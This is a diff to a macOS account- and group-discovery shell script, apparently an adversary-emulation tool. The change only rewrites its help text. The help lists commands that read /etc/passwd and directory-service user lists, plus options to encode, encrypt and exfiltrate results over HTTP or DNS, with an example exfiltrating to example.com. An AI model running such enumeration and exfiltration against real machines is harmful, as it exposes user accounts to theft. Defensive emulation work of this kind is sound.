@@ -48,49 +48,51 @@ CMD_LIST_DSCACHEUTIL_USERS="dscacheutil -q user"
 
 # Display help message
 display_help() {
-    echo "Usage: $0 [OPTIONS]"
-    echo
-    echo "Description:"
-    echo "  Identifies valid local accounts and groups on macOS systems using various native commands."
-    echo
-    echo "Options:"
-    echo "  General:"
-    echo "    -h, --help              Display this help message"
-    echo "    -v, --verbose           Enable verbose output"
-    echo "    -a, --all               Run all techniques"
-    echo
-    echo "  User Discovery:"
-    echo "    -d, --user-dirs         List user directories using 'ls -la /Users'"
-    echo "    -l, --dscl-users        List users using 'dscl . -list /Users'"
-    echo "    -p, --passwd            Display content of '/etc/passwd'"
-    echo "    -i, --id                Show current user info using 'id' command"
-    echo "    -w, --who               List logged-in users with 'who' command"
-    echo "    -s, --plist             Read user list from loginwindow plist"
-    echo "    -m, --dscacheutil       List local users using 'dscacheutil -q user'"
-    echo
-    echo "  Group Discovery:"
-    echo "    -g, --all-groups        Run all group discovery techniques"
-    echo "    -gc, --cache-groups     List groups using 'dscacheutil -q group'"
-    echo "    -gd, --dscl-groups      List groups using 'dscl . -list /Groups'"
-    echo "    -ge, --etc-groups       List groups using 'grep /etc/group'"
-    echo "    -gi, --id-groups        List groups using 'id -G'"
-    echo "    -gg, --groups-cmd       List groups using 'groups' command"
-    echo
-    echo "  Output Manipulation:"
-    echo "    --encode=TYPE           Encode output (b64|hex|uuencode|perl_b64|perl_utf8)"
-    echo "    --exfil=URI             Exfiltrate output to URI using HTTP GET"
-    echo "    --exfil=dns=DOMAIN      Exfiltrate output via DNS queries to DOMAIN (Base64 encoded)"
-    echo "    --encrypt=METHOD        Encrypt output (aes|blowfish|gpg). Generates a random key."
-    echo "    --log                 Enable logging of output to a file"
-    echo
-    echo "Examples:"
-    echo "  $0 -a                     Run all discovery techniques"
-    echo "  $0 -d -l -p               List user directories, DSCL users, and passwd content"
-    echo "  $0 -g                     Run all group discovery techniques"
-    echo "  $0 -m --encode=b64        List local users and encode output in base64"
-    echo "  $0 -a --exfil=http://example.com --encrypt=aes  Run all techniques, encrypt, and exfiltrate"
-    echo
-    echo "Note: Some options may require elevated privileges to execute successfully."
+    cat << 'EOF'
+Usage: $0 [OPTIONS]
+
+Description:
+  Identifies valid local accounts and groups on macOS systems using various native commands.
+
+Options:
+  General:
+    -h, --help              Display this help message
+    -v, --verbose           Enable verbose output 
+    -a, --all               Run all techniques
+
+  User Discovery:
+    -d, --user-dirs         List user directories using 'ls -la /Users'
+    -l, --dscl-users        List users using 'dscl . -list /Users'
+    -p, --passwd            Display content of '/etc/passwd'
+    -i, --id                Show current user info using 'id' command
+    -w, --who               List logged-in users with 'who' command
+    -s, --plist             Read user list from loginwindow plist
+    -m, --dscacheutil       List local users using 'dscacheutil -q user'
+
+  Group Discovery:
+    -g, --all-groups        Run all group discovery techniques
+    -gc, --cache-groups     List groups using 'dscacheutil -q group'
+    -gd, --dscl-groups      List groups using 'dscl . -list /Groups'
+    -ge, --etc-groups       List groups using 'grep /etc/group'
+    -gi, --id-groups        List groups using 'id -G'
+    -gg, --groups-cmd       List groups using 'groups' command
+
+  Output Manipulation:
+    --encode=TYPE           Encode output (b64|hex|uuencode|perl_b64|perl_utf8)
+    --exfil=URI            Exfiltrate output to URI using HTTP GET
+    --exfil=dns=DOMAIN     Exfiltrate output via DNS queries to DOMAIN (Base64 encoded)
+    --encrypt=METHOD       Encrypt output (aes|blowfish|gpg). Generates a random key.
+    --log                  Enable logging of output to a file
+
+Examples:
+  $0 -a                     Run all discovery techniques
+  $0 -d -l -p               List user directories, DSCL users, and passwd content
+  $0 -g                     Run all group discovery techniques
+  $0 -m --encode=b64        List local users and encode output in base64
+  $0 -a --exfil=http://example.com --encrypt=aes  Run all techniques, encrypt, and exfiltrate
+
+Note: Some options may require elevated privileges to execute successfully.
+EOF
 }
 
 # Get current user: used for logs only 
